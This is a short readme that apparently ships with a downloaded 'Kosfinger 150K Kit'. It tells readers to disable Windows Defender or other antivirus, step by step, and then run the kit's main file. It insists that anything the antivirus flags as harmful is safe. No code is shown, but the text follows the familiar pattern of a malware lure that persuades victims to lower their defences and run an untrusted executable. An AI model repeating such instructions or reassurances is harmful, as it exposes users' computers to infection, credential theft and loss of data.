*************************************************************************************************************************************************
*************************************************************************************************************************************************
*************************************************************************************************************************************************
*             Thank you for downloading "The Kosfinger 150K Kit - Ultimate Kit"!								*
*																		*
*																		*
*																		*
*************************************************************************************************************************************************
*************************************************************************************************************************************************
*************************************************************************************************************************************************


Before you proceed, please carefully follow the instructions below to ensure the kit functions correctly.

1. Disable Your Antivirus Software
	Before running the main file, it's crucial to temporarily disable your antivirus software. 
	The kit includes tools and scripts that may be flagged as harmful by your antivirus due to their nature, but rest assured, they are safe to use. 
	Disabling your antivirus will prevent any false positives or interruptions during the process.

   To disable your antivirus:

		Windows Defender: Go to "Settings" > "Update & Security" > "Windows Security" > "Virus & Threat Protection." Under "Virus & Threat Protection settings," click "Manage settings" and toggle off "Real-time protection."
		Third-Party Antivirus Software: Locate the antivirus icon in the system tray (bottom-right corner), right-click, and look for an option to disable or pause protection. Follow the on-screen prompts.
IMPORTANT: Remember to re-enable your antivirus software after you have finished using the kit.

2. Run the Main File
	Once your antivirus is disabled, locate and run the file named:

		"The Kosfinger 150K Kit - Ultimate Kit"

	Double-click the file to start the process. Follow any on-screen instructions that may appear.

3. Post-Installation
	After running the file and completing any necessary steps, you can safely re-enable your antivirus software. Ensure everything is working as expected.

********************************************
Need Help?
If you encounter any issues or have questions, feel free to contact our support team.

Thank you for using "The Kosfinger 150K Kit - Ultimate Kit"!

